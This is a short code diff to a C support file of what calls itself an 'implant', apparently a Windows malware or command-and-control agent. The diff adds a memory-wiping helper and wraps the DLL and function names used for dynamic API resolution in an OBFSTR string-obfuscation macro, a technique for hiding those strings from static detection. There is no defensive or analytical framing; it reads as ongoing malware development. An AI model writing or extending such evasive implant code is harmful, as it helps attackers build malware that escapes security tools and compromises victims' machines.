@@ -5,6 +5,7 @@
  * the already-loaded bcrypt handle from crypto.c.
  */
 #include "../include/implant.h"
+#include "../include/obfstr.h"
 #include <string.h>
 #include <stdarg.h>
 
@@ -26,6 +27,11 @@ char *ImplantStrDup(const char *s) {
     return out;
 }
 
+void SecureZero(void *buf, SIZE_T len) {
+    volatile BYTE *p = (volatile BYTE *)buf;
+    for (SIZE_T i = 0; i < len; i++) p[i] = 0;
+}
+
 /* ── Randomness ──────────────────────────────────────────────────────────── */
 
 void RandBytes(BYTE *buf, DWORD len) {
@@ -33,9 +39,9 @@ void RandBytes(BYTE *buf, DWORD len) {
     typedef NTSTATUS (WINAPI *pfnBCryptGenRandom)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
     static pfnBCryptGenRandom pFn = NULL;
     if (!pFn) {
-        HMODULE h = GetModuleHandleA("bcrypt.dll");
-        if (!h) h = LoadLibraryA("bcrypt.dll");
-        if (h) pFn = (pfnBCryptGenRandom)(FARPROC)GetProcAddress(h, "BCryptGenRandom");
+        HMODULE h = GetModuleHandleA(OBFSTR("bcrypt.dll"));
+        if (!h) h = LoadLibraryA(OBFSTR("bcrypt.dll"));
+        if (h) pFn = (pfnBCryptGenRandom)(FARPROC)GetProcAddress(h, OBFSTR("BCryptGenRandom"));
     }
     if (pFn && pFn(NULL, buf, len, 2 /* BCRYPT_USE_SYSTEM_PREFERRED_RNG */) == 0)
         return;
